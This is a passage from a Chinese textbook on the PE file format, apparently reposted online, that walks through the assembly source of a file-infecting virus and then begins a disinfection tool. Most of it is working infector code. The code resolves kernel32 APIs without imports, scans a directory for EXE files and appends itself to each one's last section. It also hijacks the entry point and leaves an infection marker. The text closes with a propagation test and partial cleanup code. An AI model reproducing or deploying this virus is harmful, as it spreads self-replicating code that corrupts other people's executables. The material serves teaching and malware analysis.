80 dwPatchCodeSegStart 	dd ? ;补丁程序所在节在文件中的起始地址
81 dwSectionCount 		dd ? ;目标文件节的个数
82 dwSections 			dd ? ;所有节表大小
83 dwNewHeaders 		dd ? ;新文件头的大小
84 dwFileAlign 			dd ? ;文件对齐粒度
85 dwFirstSectionStart 	dd ? ;目标文件第一节距离文件起始的偏移量
86 dwOff 				dd ? ;新文件比原来多出来的部分
87 dwValidHeadSize 		dd ? ;目标文件PE头的有效数据长度
88 dwHeaderSize			dd ? ;文件头长度
89 dwBlock1 			dd ? ;原PE头的有效数据长度+补丁程序的有效数据长度
90 dwPE_SECTIONSize	 	dd ? ;PE头+节表大小
91 dwSectionsLeft 		dd ? ;目标文件所有节数据的大小
92 dwNewSectionSize 	dd ? ;新增加节对齐后的尺寸
93 dwNewSectionOff 		dd ? ;新增加节项描述在文件中的偏移
94 dwDstSizeOfImage 	dd ? ;目标文件内存映像的大小
95 dwNewSizeOfImage 	dd ? ;新增加的节在内存映像中的大小
96 dwNewFileAlignSize 	dd ? ;文件对齐后的大小
97 dwSectionsAlignLeft 	dd ? ;目标文件节在文件中对齐后的大小
98 dwLastSectionAlignSize 	dd ? ;目标文件最后一节对齐后的最终大小，包含代码
99 dwLastSectionStart 		dd ? ;目标文件最后一节在文件中的偏移
100 dwSectionAlign 			dd ? ;节对齐粒度
101 dwVirtualAddress 		dd ? ;最后一节的起始RVA
102 dwEIPOff 				dd ? ;新eip指针和旧eip指针的距离
103
104
105
106 dwDstEntryPoint dd ? ;旧的入口地址
107 dwNewEntryPoint dd ? ;新的入口地址
108
```

------

==以上定义的参数变量是供正常EXE文件打补丁用的==。==补丁程序里的补丁工具部分将采用本书第17章介绍的最简单的方法，即将补丁程序添加到最后一节==。如果你不熟悉这些变量，请参考本书第17章的内容。

------

```assembly
109 lpFunAddress equ this byte ;函数地址列表
110 _FindFirstFileA dd 00000000h
111 _FindNextFileA dd 00000000h
112 _FindClose dd 00000000h
113 _CreateFileA dd 00000000h
114 _SetFilePointer dd 00000000h
115 _SetFileAttributesA dd 00000000h
116 _CloseHandle dd 00000000h
117 _GetCurrentDirectoryA dd 00000000h
118 _SetCurrentDirectoryA dd 00000000h
119 _GetWindowsDirectoryA dd 00000000h
120 _GetSystemDirectoryA dd 00000000h
121 _CreateFileMappingA dd 00000000h
122 _MapViewOfFile dd 00000000h
123 _UnmapViewOfFile dd 00000000h
124 _SetEndOfFile dd 00000000h
125
```

------

==函数地址列表（类似于导入表的IAT部分）不需要有任何结束标识，也不需要有个数声明==。==因为补丁程序可以通过函数名获取循环的次数，而每个函数地址都是双字节的==。==补丁程序可以通过很简单的算法定位到指定序号的函数地址变量所在的位置==。

------

```assembly
126 MAX_PATH equ 260
127
128
129 WIN32_FIND_DATA1 equ this byte
130 WFD_dwFileAttributes dd ?
131 WFD_ftCreationTime FILETIME ＜?＞
132 WFD_ftLastAccessTime FILETIME ＜?＞
133 WFD_ftLastWriteTime FILETIME ＜?＞
134 WFD_nFileSizeHigh dd ?
135 WFD_nFileSizeLow dd ?
136 WFD_dwReserved0 dd ?
137 WFD_dwReserved1 dd ?
138 WFD_szFileName db MAX_PATH dup (?)
139 WFD_szAlternateFileName db 13 dup (?)
140 db 03 dup (?)
141 directories equ this byte
142 OriginDir db 7Fh dup(0) ;应用程序所在的目录
143
144 dwDirectoryCount equ(($-directories)/7Fh)
145 mirrormirror db dwDirectoryCount ;目录个数
146
147
148
```

------

==以上定义了查找文件时用到的数据结构==。==其中`directories`是病毒要感染的目录列表。由于补丁程序只感染当前目录，所以目录个数变量`dwDirectoryCount`被设置为1，其设置方法如行144所示==。如果还有其他的目录需要感染，那么在这里加上目录的定义即可。记得每个目录的绝对路径必须凑齐7Fh字节，否则计算出来的`dwDirectoryCount`就是个错误的数字。如下所示，可以定义第二个目录`secondDir`：

------

```assembly
directories equ this byte
OriginDir db 7Fh dup(0) ;应用程序所在的目录
secondDir db 'c:\aa',0,79 dup(0) ;添加的第二个目录
dwDirectoryCount equ(($-directories)/7Fh)
mirrormirror db dwDirectoryCount ;目录个数
```

------

### 2.私有函数定义

==为了实施病毒传播，以及实现病毒的隐蔽特性，将PE病毒补丁代码附加到要感染的对象中，需要定义很多辅助函数，这些函数是内部私有的，由主程序调用==。

下列内部私有函数大部分都是以前介绍过的，以下内容省略许多。

------

```assembly
149 ;-----------------------------
150 ;错误Handler
152 _SEHHandler proc _lpException,_lpSEH,_lpContext,_lpDispatcher
170 ;-----------------------------
171 ;对齐
176 _align proc
189 ;------------------------------------
190 ;根据kernel32.dll中的一个地址获取它的基地址
192 _getKernelBase proc _dwKernelRetAddress
219 ;-------------------------------
220 ;获取指定字符串的API函数的调用地址
224 _getApi proc _hModule,_lpApi
292 ;---------------------
293 ;获取所有的API入口地址
294 ;---------------------
295 _getAllAPIs proc
296 pushad
297 call @F ;免去重定位
298 @@:
299 pop ebx
300 sub ebx,offset @B ;求定位基地址ebx
301 mov ebp,ebx
302
303 .repeat
304 push esi
305 mov eax,[ebx+kernel]
306 push eax
307 call _getApi
308 mov dword ptr [edi],eax
309 ;修改esi的值指向下一个函数名
310 mov al,byte ptr [esi]
311 .break.if al == 0BBh
312 .repeat
313 mov al,byte ptr [esi]
314 .if al == 0
315 inc esi
316 .break
317 .endif
318 inc esi
319 .until FALSE
320
321 ;修改edi的值指向下一个地址
322 add edi,4
323 .until FALSE
324 popad
325 ret
326 _getAllAPIs endp
327
328
329 ;----------------------------------------
330 ;获取节的个数
332 _getSectionCount proc _lpFileHead
347 ;----------------------------------------
348 ;获取文件的对齐粒度
350 getSectionAlign proc _lpFileHead
367 ;---------------------
368 ;将文件偏移转换为内存偏移量RVA
372 _OffsetToRVA proc _lpFileHead,_dwOffset
408 ;---------------------
409 ;将内存偏移量RVA转换为文件偏移
411 _RVAToOffset proc _lpFileHead,_dwRVA
447 ;----------------------------------------
448 ;获取新节的RVA
450 _getNewSectionRVA proc _lpFileHead
493 ;------------------------
494 ;获取RVA所在节的名称
496 _getRVASectionName proc _lpFileHead,_dwRVA
529 ;------------------------
530 ;获取RVA所在节的文件起始地址
532 _getRVASectionStart proc _lpFileHead,_dwRVA
565 ;------------------------
566 ;获取RVA所在节的原始大小
568 _getRVASectionSize proc _lpFileHead,_dwRVA
601 ;-------------------
602 ;获取代码所在节的大小
608 _getCodeSegSize proc _lpHeader
625 ;-------------------
626 ;获取补丁程序所在节的大小
630 _getCodeSegStart proc _lpHeader
646 ;-------------------------
647 ;获取代码入口
649 _getEntryPoint proc _lpFile
669 ;------------------------
670 ;获取RVA所在节在文件中对齐以后的大小
672 _getRVASectionRawSize proc _lpFileHead,_dwRVA
705 _getRVACount proc _lpFileHead
719 ;------------------------------------
720 ;获取最后一节在文件的偏移
722 _getLastSectionStart proc _lpFileHead
744 _getFileAlign proc _lpFileHead
760 ;-----------------------------
761 ;截文件
762 ;入口：ecx——要截取的文件大小
763 ;出口：无
764 ;-----------------------------
765 truncFile proc
766 xor eax,eax
767 push eax
768 push eax
769 push ecx
770 push dword ptr [ebx+fileHandle]
771 call [ebx+_SetFilePointer]
772 push dword ptr [ebx+fileHandle]
773 call [ebx+_SetEndOfFile]
774 ret
775 truncFile endp
776
777 ;------------------------------
778 ;打开文件
779 ;入口：esi——指向要打开的文件的名字
780 ;出口：eax——如果成功是文件句柄，失败则是-1
781 ;------------------------------
782 openFile proc
783 xor eax,eax
784 push eax
785 push eax
786 push 0000003h
787 push eax
788 inc eax
789 push eax
790 push 80000000h or 40000000h
791 push esi
792 call [ebx+_CreateFileA]
793 ret
794 openFile endp
795
796 ;-----------------------------------
797 ;创建映射
798 ;入口：ecx——映射大小
799 ;出口：eax——成功为映射句柄
800 ;-----------------------------------
801 createMap proc
802 xor eax,eax
803 push eax
804 push ecx
805 push eax
806 push 000000004h
807 push eax
808 push dword ptr [ebx+fileHandle]
809 call [ebx+_CreateFileMappingA]
810 ret
811 createMap endp
812
813 ;-------------------------------------
814 ;映射文件到进程地址空间
815 ;入口：ecx——要映射的尺寸
816 ;出口：eax——成功则返回地址
817 ;-------------------------------------
818 mapFile proc
819 xor eax,eax
820 push ecx
821 push eax
822 push eax
823 push 00000002h
824 push dword ptr [ebx+mapHandle]
825 call [ebx+_MapViewOfFile]
826 ret
827 mapFile endp
828
```

------

以上代码虽然很多，但都很简单，而且大部分的函数功能在第17章中都介绍过。

### 3.感染文件

==接下来的函数你看起来可能很眼熟，这是PE病毒具备传播性的最核心的部分，即向正常的EXE文件中写入病毒代码==。==写入方法和向PE程序最后一节写入代码的方法几乎是一模一样的，正是在这一部分，PE病毒补丁代码才具备了补丁工具的功能==。因为注释比较详细，相信你也可以很容易看懂。

------

```assembly
829 ;---------------------------------
830 ;指定感染文件
831 ;---------------------------------
832 _infect proc
833 ;获取文件名，清除文件属性
834 lea esi,[ebx+WFD_szFileName]
835 push 80h
836 push esi
837 call [ebx+_SetFileAttributesA]
838 call openFile
839 inc eax ;如果eax=-1，则打开文件出错
840 jz cannotOpen
841 dec eax
842 mov dword ptr [ebx+fileHandle],eax ;存储文件句柄
843 mov ecx,dword ptr [ebx+WFD_nFileSizeLow]
844 call createMap ;创建映射文件
845 or eax,eax
846 jz closeFile
847 mov dword ptr [ebx+mapHandle],eax
848 ;映射文件到内存
849 mov ecx,dword ptr [ebx+WFD_nFileSizeLow]
850 call mapFile
851 or eax,eax
852 jz unMapFile
853 mov dword ptr [ebx+mapAddress],eax
```

------

==行833～853打开目标PE文件，将文件属性设置为一般文件，并实施内存映射==。

------

```assembly
854
855
856
857 ;开始处理文件，判断文件是否为合法PE文件
858 mov esi,[eax+3ch]
859 add esi,eax
860 cmp dword ptr [esi],"EP" ;比较是否为"PE"
861 jnz noInfect
862
863 push esi
864 mov esi,dword ptr [ebx+mapAddress]
865 add esi,4
866 mov eax,dword ptr [esi]
867 pop esi
868
869 cmp eax,"iliq" ;判断是否被感染过
870 jz noInfect
```

------

==以上代码判断打开的文件是否为PE文件，如果是，则继续通过标志位判断是否已经被感染过==；==如果已经被感染过，则不再感染==。==标志位位于PE文件开始的第4个字节处，下面列出了一个被感染的PE文件的头部信息==：

![image](https://github.com/YangLuchao/img_host/raw/master/20231101/image.20joc29gsl8g.jpg)

如上所示，==文件头开始的第4个字节处，存储了`iliq`标志，补丁程序在打补丁前会首先判断此处是否已存在该标志，如果存在则略过不再对PE文件执行打补丁操作，这样可以避免对一个已经打过补丁的PE文件进行重复的多次补丁过程==。

继续往下看，==以下是将病毒代码附加到其他PE文件的部分，附加位置是最后一节==。

------

```assembly
871
872 push dword ptr [esi+3ch] ;保存文件对齐
873 pop ecx ;恢复文件对齐
874
875
876 mov eax,VIR_TOTAL_SIZE
877 mov dword ptr [ebx+dwPatchCodeSize],eax
878
879
880 ;将文件大小按照文件对齐粒度对齐
881 invoke getFileAlign,[ebx+mapAddress]
882 mov dword ptr [ebx+dwFileAlign],eax
883 xchg eax,ecx
884 mov eax,dword ptr [ebx+WFD_nFileSizeLow]
885 invoke _align
886 mov dword ptr [ebx+dwNewFileAlignSize],eax
887
888 ;求最后一节在文件中的偏移
889 invoke getLastSectionStart,[ebx+mapAddress]
890 mov dword ptr [ebx+dwLastSectionStart],eax
891
892 ;求最后一节的大小
893 mov eax,dword ptr [ebx+dwNewFileAlignSize]
894 sub eax,dword ptr [ebx+dwLastSectionStart]
895 add eax,dword ptr [ebx+dwPatchCodeSize]
896 ;将该值按照文件对齐粒度对齐
897 mov ecx,dword ptr [ebx+dwFileAlign]
898 invoke _align
899 mov dword ptr [ebx+dwLastSectionAlignSize],eax
900
901 ;求新文件大小
902 mov eax,dword ptr [ebx+dwLastSectionStart]
903 add eax,dword ptr [ebx+dwLastSectionAlignSize]
904 mov dword ptr [ebx+dwNewFileSize],eax
905
906 ;关闭内存映射
907 pushad
908 push dword ptr [ebx+mapAddress]
909 call [ebx+_UnmapViewOfFile]
910 push dword ptr [ebx+mapHandle]
911 call [ebx+_CloseHandle]
912 popad
913
914
915 ;用新尺寸重新映射文件
916 mov dword ptr [ebx+newSize],eax
917 xchg ecx,eax
918 call createMap
919 or eax,eax
920 jz closeFile
921 mov dword ptr [ebx+mapHandle],eax
922 mov ecx,dword ptr [ebx+newSize]
923 call mapFile
924 or eax,eax
925 jz unMapFile
926 mov dword ptr [ebx+mapAddress],eax
927
928 ;修正参数部分
929
930 ;计算SizeOfRawData
931 invoke _getRVACount,[ebx+mapAddress]
932 xor edx,edx
933 dec eax
934 mov ecx,sizeof IMAGE_SECTION_HEADER
935 mul ecx
936
937 mov edi,dword ptr [ebx+mapAddress]
938 assume edi:ptr IMAGE_DOS_HEADER
939 add edi,[edi].e_lfanew
940 mov esi,edi
941 assume esi:ptr IMAGE_NT_HEADERS
942 add edi,sizeof IMAGE_NT_HEADERS
943 add edi,eax
944 assume edi:ptr IMAGE_SECTION_HEADER
945 mov eax,dword ptr [ebx+dwLastSectionAlignSize]
946 mov [edi].SizeOfRawData,eax
947
948 ;计算Misc值
949 invoke getSectionAlign,[ebx+mapAddress]
950 mov dword ptr [ebx+dwSectionAlign],eax
951 xchg eax,ecx
952 mov eax,dword ptr [ebx+dwLastSectionAlignSize]
953 invoke _align
954 mov [edi].Misc,eax
955
956 ;修改标志，使节可读、可写、可执行
957 or dword ptr [edi].Characteristics,0A0000020h ;更改节的标志
958 push esi
959 mov esi,dword ptr [ebx+mapAddress]
960 add esi,4
961 mov dword ptr [esi],"iliq" ;设置病毒标志，标明已感染
962 pop esi
963
964 ;计算VirtualAddress
965 mov eax,[edi].VirtualAddress ;获取原始RVA值
966 mov dword ptr [ebx+dwVirtualAddress],eax
967
968 ;修正函数入口地址
969 mov eax,dword ptr [ebx+dwNewFileAlignSize]
970 invoke _OffsetToRVA,[ebx+mapAddress],eax
971 mov dword ptr [ebx+dwNewEntryPoint],eax
972 mov edi,dword ptr [ebx+mapAddress]
973 assume edi:ptr IMAGE_DOS_HEADER
974 add edi,[edi].e_lfanew
975 assume edi:ptr IMAGE_NT_HEADERS
976 mov eax,[edi].OptionalHeader.AddressOfEntryPoint
977 mov dword ptr [ebx+dwDstEntryPoint],eax
978 mov eax,dword ptr [ebx+dwNewEntryPoint]
979 mov [edi].OptionalHeader.AddressOfEntryPoint,eax
980
981 mov eax,dword ptr [ebx+dwDstEntryPoint]
982 sub eax,dword ptr [ebx+dwNewEntryPoint]
983 mov dword ptr [ebx+dwEIPOff],eax
984
985 ;修正SizeOfImage
986 mov eax,dword ptr [ebx+dwLastSectionAlignSize]
987 mov ecx,dword ptr [ebx+dwSectionAlign]
988 invoke _align
989 ;获取最后一个节的VirtualAddress
990 add eax,dword ptr [ebx+dwVirtualAddress]
991 mov [edi].OptionalHeader.SizeOfImage,eax
992
993 ;复制补丁程序
994 lea esi,[ebx+vir _start]
995 mov edi,dword ptr [ebx+mapAddress]
996 add edi,dword ptr [ebx+dwNewFileAlignSize]
997
998 mov ecx,dword ptr [ebx+dwPatchCodeSize]
999 rep movsb
1000
1001 ;修正补丁程序中的E9指令后的操作数
1002 mov eax,dword ptr [ebx+mapAddress]
1003 add eax,dword ptr [ebx+dwNewFileAlignSize]
1004 add eax,dword ptr [ebx+dwPatchCodeSize]
1005
1006
1007 sub eax,5 ;eax指向了E9的操作数
1008 mov edi,eax
1009
1010 sub eax,dword ptr [ebx+mapAddress]
1011 add eax,4
1012
1013 nop
1014 mov ecx,dword ptr [ebx+dwDstEntryPoint]
1015 invoke _OffsetToRVA,[ebx+mapAddress],eax
1016 sub ecx,eax
1017 mov dword ptr [edi],ecx
1018 inc byte ptr [ebx+infections] ;增加计数，如果超过指定个数，则返回
1019 jmp unMapFile ;将新增加的模块追加到文件尾部
1020
1021 noInfect:
1022 ;如果修改失败，则恢复原文件，并将计数减1
1023 dec byte ptr [ebx+infections]
1024 mov ecx,dword ptr [ebx+WFD_nFileSizeLow]
1025 call truncFile
1026 unMapFile:
1027 push dword ptr [ebx+mapAddress]
1028 call [ebx+_UnmapViewOfFile]
1029 closeMap:
1030 push dword ptr [ebx+mapHandle]
1031 call [ebx+_CloseHandle]
1032 closeFile:
1033 push dword ptr [ebx+fileHandle]
1034 call [ebx+_CloseHandle]
1035 cannotOpen:
1036 ;设置文件原先的属性
1037 push dword ptr [ebx+WFD_dwFileAttributes]
1038 lea eax,[ebx+WFD_szFileName]
1039 push eax
1040 call [ebx+_SetFileAttributesA]
1041
1042 ret
1043 _infect endp
1044
```

------

以下函数是一些辅助函数，因注释比较明晰，就不再详细解释。

------

```assembly
1045 ;-----------------------------
1046 ;对指定个数的文件进行感染
1047 ;-----------------------------
1048 _infectIt proc
1049 ;首先找到第一个符合条件的文件
1050 and dword ptr [ebx+infections],00000000h ;计数清零
1051 lea eax,[ebx+offset WIN32_FIND_DATA1]
1052 push eax
1053 lea eax,[ebx+offset EXE_MASK]
1054 push eax
1055 call [ebx+_FindFirstFileA]
1056
1057 inc eax ;如果没有，返回-1，则退出
1058 jz failInfect
1059 dec eax
1060 mov dword ptr [ebx+searchHandle],eax ;存储搜索文件句柄
1061 _1:
1062 call _infect
1063 cmp byte ptr [ebx+infections],INFECTFILES ;处理超过指定个数文件，则退出
1064 jz failInfect
1065 _2:
1066 ;清空上一次填充的文件名内容，为下一步做准备
1067 lea edi,[ebx+WFD_szFileName]
1068 mov ecx,MAX_PATH
1069 xor al,al
1070 rep stosb
1071 lea eax,[ebx+offset WIN32_FIND_DATA1]
1072 push eax
1073 push dword ptr [ebx+searchHandle]
1074 ;找下一个符合条件的文件
1075 call [ebx+_FindNextFileA]
1076 or eax,eax ;找到下一个文件则转到_1继续处理
1077 jnz_1
1078 failInfect:
1079 ret
1080 _infectIt endp
1081
1082 _infectItAll proc
1083 ;指向第一个目录
1084 lea edi,[ebx+directories]
1085 push edi
1086 ;处理当前目录中的EXE文件
1087 call [ebx+_SetCurrentDirectoryA]
1088 call _infectIt
1089 ret
1090 _infectItAll endp
1091
1092
1093
```

------

### 4.主函数

==实现补丁程序功能模块之前，要做以下工作，这些工作被封装在一个名为`_start`的子程序里==。==该子程序首先获取`kernel32.dll`的基地址，然后获取两个重要函数的地址，并通过函数`_getAllAPIs`将数据定义中所有用到的函数所在的内存地址进行初始化==。==最后调用函数`_infectItAll`实施感染==。

------

```assembly
1094 _start proc
1095 local hKernel32Base:dword ;存放kernel32.dll基地址
1096 local hUser32Base:dword
1097
1098 local _getProcAddress:_ApiGetProcAddress ;定义函数
1099 local _loadLibrary:_ApiLoadLibrary
1100 local _createDir:_ApiCreateDir
1101
1102 pushad
1103
1104 ;获取kernel32.dll的基地址
1105 invoke _getKernelBase,eax
1106 mov hKernel32Base,eax
1107 mov dword ptr [ebx+kernel],eax
1108
1109 ;从基地址出发搜索GetProcAddress函数的首址
1110 mov eax,offset szGetProcAddr
1111 add eax,ebx
1112
1113 mov edi,hKernel32Base
1114 mov ecx,edi
1115
1116 invoke _getApi,ecx,eax
1117 mov _getProcAddress,eax ;为函数引用赋值GetProcAddress
1118
1119 ;使用GetProcAddress函数的首址
;传入两个参数调用GetProcAddress函数，获得CreateDirA的首址
1120 mov eax,offset szCreateDir
1121 add eax,ebx
1122 invoke _getProcAddress,hKernel32Base,eax
1123 mov _createDir,eax
1124
1125 ;调用创建目录的函数（病毒的破坏性）
1126 mov eax,offset szDir
1127 add eax,ebx
1128 invoke _createDir,eax,NULL
1129
1130 ;开始我们的快乐之旅途
1131
1132 lea edi,[ebx+lpFunAddress]
1133 lea esi,[ebx+szFunNames]
1134 ;从kernel的导出表获取所有相关API的入口地址
1135 call _getAllAPIs
1136
1137 ;获取当前目录
1138 lea edi,[ebx+OriginDir]
1139 push edi
1140 push 7Fh
1141 call [ebx+_GetCurrentDirectoryA]
1142 ;感染当前目录的所有EXE文件
1143 call _infectItAll
1144
1145 popad
1146 ret
1147 _start endp
1148
1149 ;EXE文件新的入口地址
1150
1151 _NewEntry:
1152 ;获取当前函数的栈顶值
1153 mov eax,dword ptr [esp]
1154 push eax
1155 call @F ;免去重定位
1156 @@:
1157 pop ebx
1158 sub ebx,offset @B
1159 pop eax
1160 invoke _start
1161 jmpToStart db 0E9h,0F0h,0FFh,0FFh,0FFh
1162 ret
1163 vir _end equ this byte
1164 end _NewEntry
```

------

==代码行1151～1162是整个补丁程序最开始要做的事情==。==行1151的标号`_NewEntry`是补丁代码的入口起点，也是被补丁后程序的新的入口地址==。==这部分代码首先通过重定位技术获取修正绝对地址用的寄存器`ebx`，然后调用`_start`子程序完成补丁功能==。==行1161是嵌入补丁框架中的跳转指令E9及其操作数==。到此为止，该病毒程序的补丁代码就分析完了。

## 23.2.3　病毒传播测试

测试前需要制作一个带有病毒代码的PE文件，使用第17章中的补丁程序bind.exe将本章介绍的病毒补丁程序附加到某个系统PE文件（比如notepad.exe）中。附加了补丁程序以后的目标文件C:\bindC.exe即为携带了病毒的PE文件。下面将使用该文件对另外多个正常的PE文件进行测试，病毒的传播测试步骤如下。

在C盘上建立ql\a子目录，将Windows系统中的几个系统可执行文件，以及刚生成的bindC.exe复制到C:\ql\a子目录中；运行bindC.exe。

通过运行前和运行后的文件大小对比可以发现，C:\ql\a目录中除bindC.exe外的其他可执行程序确实发生了变化，以下是前后的文件列表对比。

bindC.exe运行前该目录列表如下：

![image](https://github.com/YangLuchao/img_host/raw/master/20231101/image.5sg21t41xco0.jpg)

bindC.exe运行后该目录列表如下：

![image](https://github.com/YangLuchao/img_host/raw/master/20231101/image.6ta2kx19l080.jpg)

可以看到，附加的代码长度（以notepad为例）为70144-66560=3584（十六进制为0E00h）个字节。

仔细观察你会发现，除了bindC.exe文件大小未发生变化外，其他PE文件的大小都增加了3584个字节。为什么bindC.exe的长度没有发生变化呢？仔细想一想，bindC.exe被操作系统以独占方式打开，因此，修改该文件时会因无法打开该文件而跳过，这并不妨碍其他的PE文件的修改。

关闭bindC.exe，运行一个已经被修改的其他文件（比如notepad.exe）。因为运行的notepad.exe被打过补丁，所以它也会对本目录下的其他EXE文件进行感染。由于除bindC.exe以外的其他EXE文件都已经被感染，即有了病毒的特征标志，因此不会重复感染；但是，bindC.exe还没有被感染，所以，运行的结果是bindC.exe的大小也发生了变化。

## 23.2.4　感染前后PE结构对比

使用工具PEInfo分析一个PE文件，重点看文件执行入口和最后一节的信息。以notepad.exe为例，感染前notepad.exe的显示信息为：

![image](https://github.com/YangLuchao/img_host/raw/master/20231101/image.1dy5zm8mec00.jpg)

感染后notepad.exe的显示信息为：

![image](https://github.com/YangLuchao/img_host/raw/master/20231101/image.4457yhc0pms0.jpg)

感染前后文件执行入口地址发生了变化，文件执行入口指明了嵌入的补丁程序代码段开始的位置；最后一节的描述信息发生了变化，说明补丁程序被嵌入到了最后一节中。

# 23.3　解毒代码的编写

==编写解毒代码的过程与病毒感染思路刚好相反，只要通过静态分析或动态分析知道病毒感染文件的机制，自然也就清楚了编写解毒代码的方法==。

==其实，PE病毒的清理并不是一件容易的事情。因为PE感染方式千差万别，特别是病毒使用了一些`反跟踪`、`反调试`技术，前期对病毒代码的分析难度相当大，想通过程序实现自动分析基本是不可能实现的==。==所以，大部分的商业反病毒软件在对待PE病毒的处理上统一采用删除或隔离操作==。下面来看针对本章病毒程序的编写解毒代码的思路。

## 23.3.1　基本思路

完全掌握了PE病毒的感染机制，即可编写解毒程序，使感染的PE文件恢复到原始状态（至少是不会再运行病毒代码的状态）。

==从病毒编写思路来看，如果仅是为了杜绝文件被感染，只需要将硬盘中所有的未感染的PE头部开始的第2个双字，设置为病毒标志字节"iliq"，病毒就不会对文件实施破坏==。==但这种方法只能算是权益之计。还有一种快速的手动清理方法，那就是找到最后一节的C3字节码前最后一个非零双字，通过获取的病毒代码大小，计算出原始的入口地址==；==然后，将该入口地址重新覆盖PE入口地址，就可以达到跳过PE病毒代码的目的==。例如以下所示的黑体部分，为感染后的记事本程序中与原始入口地址有关的部分。

![image](https://github.com/YangLuchao/img_host/raw/master/20231101/image.5ictmx2i0yk0.jpg)

但是，经过以上方法处理的PE中依旧存留着病毒代码，尽管不再起作用，总让人感觉很多余。所以，最好的解决办法就是分析病毒代码原理，编写解毒代码。

本实例解毒软件的编写思路大致为：通过程序入口找到病毒代码在文件的起始位置，然后去掉该位置后的所有数据，重新更正最后一节的描述项和程序入口地址。

综上所述，解毒程序的编写分为以下三步：

1. ==步骤1　计算病毒代码的大小。==

2. ==步骤2　得到目标PE感染前原始的入口地址。==

3. ==步骤3　修正目标PE的相关参数。==

下面按照这三步逐一介绍。

## 23.3.2　计算病毒代码大小

==解毒编程的第一步是要计算出病毒代码的大小==。手工计算方法很简单，找一个没有被感染的程序，与感染后的这个程序进行比对；然后，使用PEInfo查看最后一节文件中对齐后的长度变化，即得出病毒代码大小。从前面的分析中可以看出，该值为：
$$
00008e00h-00008000h=0e00h
$$
即3584个字节。

下面介绍利用程序计算病毒代码大小的方法。先来看以下字节码：

![image](https://github.com/YangLuchao/img_host/raw/master/20231101/image.54knven5b2o0.jpg)

虚线上的部分是感染前的记事本文件的最后几个字节，虚线下的部分是感染后增加的病毒代码的部分数据。

程序中对病毒代码大小的计算方法有三步：

步骤1　获取感染病毒的notepad.exe的入口地址`0x00013000`，计算该部分在最后一节中的偏移量：

$$
13000h-B000h=8000h
$$
步骤2　根据最后一节在文件的起始地址计算病毒代码所在文件的偏移`fOff`：

$$
fOff=8400h+8000h=10400h
$$
步骤3　用文件总大小减去`fOff`得到的结果即为病毒代码的大小：

$$
11200h-10400h=0e00h
$$


## 23.3.3　获取原始入口地址

首先，从最后一节的最后几个字节中找到跳转位置（因不同的目标PE最后一节大小不同，其补齐用的“00”字节的个数不定，所以必须通过算法来确定跳转指令操作数所在位置），==根据该字节所在文件偏移求出RVA，根据跳转位置和当前RVA求出原始入口RVA==。

==病毒最后跳转指令在文件中的位置：`0x0001104E`==

==根据从文件偏移到RVA的计算得出RVA：`0x00013C4E`==

==原始入口地址的值与该值的差刚好是跳转指令的操作数`0xFFFF374A`==，如下所示：

![image](https://github.com/YangLuchao/img_host/raw/master/20231101/image.3n3vzudlf0g0.jpg)

通过逆运算（非逆运算为取反加一）可以求出原始入口的地址值为：0x00007398。一定不要忘记，计算时还要加上跳转指令本身的5个字节，最后得到程序原始的入口地址为：

$$
0x00007398+5=0x0000739d
$$


## 23.3.4　修正PE头部的其他参数

被感染的PE文件中最后一节的字段需要得到修正。要修正字段包括：

```
IMAGE_SECTION_HEADER.Misc
IMAGE_SECTION_HEADER.SizeOfRawData
```

## 23.3.5　主要代码

解毒代码详细内容见代码清单23-3。

代码清单23-3　本节PE病毒的解毒代码的函数_openFile（chapter23\antiVirPE.asm）

------

```assembly
;--------------------
; 打开PE文件并处理
;--------------------
_openFile proc
  local @stOF:OPENFILENAME
  local @hFile,@hMapFile
  local @hDstFile
  local @dwFileSize1,@dwTemp

  invoke RtlZeroMemory,addr @stOF,sizeof @stOF
  mov @stOF.lStructSize,sizeof @stOF
  push hWinMain
  pop @stOF.hwndOwner
  mov @stOF.lpstrFilter,offset szExtPe
  mov @stOF.lpstrFile,offset szFileName
  mov @stOF.nMaxFile,MAX_PATH
  mov @stOF.Flags,OFN_PATHMUSTEXIST or OFN_FILEMUSTEXIST
  invoke GetOpenFileName,addr @stOF  ;让用户选择打开的文件
  .if !eax
    jmp @F
  .endif
  invoke wsprintf,addr szBuffer,addr szOut0,addr szFileName
  invoke _appendInfo,addr szBuffer

  invoke CreateFile,addr szFileName,GENERIC_READ,\
         FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,\
         OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL
  .if eax!=INVALID_HANDLE_VALUE
    mov @hFile,eax
    invoke GetFileSize,eax,NULL     ;获取文件大小
    mov totalSize,eax

    .if eax
      invoke CreateFileMapping,@hFile,\  ;内存映射文件
             NULL,PAGE_READONLY,0,0,NULL
      .if eax
        mov @hMapFile,eax
        invoke MapViewOfFile,eax,\
               FILE_MAP_READ,0,0,0
        .if eax
          mov lpMemory,eax              ;获得文件在内存的映象起始位置
          assume fs:nothing
          push ebp
          push offset _ErrFormat
          push offset _Handler
          push fs:[0]
          mov fs:[0],esp



          ;开始处理文件

          ;获得入口地址，该地址即为病毒代码的起始地址
          invoke getEntryPoint,lpMemory
          invoke _RVAToOffset,lpMemory,eax ;求文件偏移 
          mov dwVirStartOff,eax
          mov ebx,totalSize
          sub ebx,eax
          mov virSize,ebx


          ;求新文件大小
          mov eax,totalSize
          sub eax,virSize
          mov dwNewFileSize,eax

          invoke wsprintf,addr szBuffer,addr szOut124,eax
          invoke _appendInfo,addr szBuffer 
 

          ;申请内存空间
          invoke GlobalAlloc,GHND,dwNewFileSize
          mov @hDstFile,eax
          invoke GlobalLock,@hDstFile
          mov lpDstMemory,eax   ;将指针给lpDstMemory

  
          ;将目标文件拷贝到内存区域
          mov ecx,dwNewFileSize  
          invoke MemCopy,lpMemory,lpDstMemory,ecx


          invoke wsprintf,addr szBuffer,addr szOut1,virSize
          invoke _appendInfo,addr szBuffer

          ;定位到最后一个节，修改其中的SizeOfRawData
          invoke _getRVACount,lpMemory
          xor edx,edx
          dec eax
          mov ecx,sizeof IMAGE_SECTION_HEADER
          mul ecx

          nop
          mov edi,lpDstMemory
          assume edi:ptr IMAGE_DOS_HEADER

          add edi,[edi].e_lfanew
          mov esi,edi
          assume esi:ptr IMAGE_NT_HEADERS
          add edi,sizeof IMAGE_NT_HEADERS  
          add edi,eax
          assume edi:ptr IMAGE_SECTION_HEADER
          mov eax,[edi].SizeOfRawData
          sub eax,virSize
          mov [edi].SizeOfRawData,eax
          
          ;invoke wsprintf,addr szBuffer,addr szOutHex,eax
          ;invoke _appendInfo,addr szBuffer
          
          ;计算出程序最原始的入口地址
        
          
          ;从文件最后往前找第一个C3字节
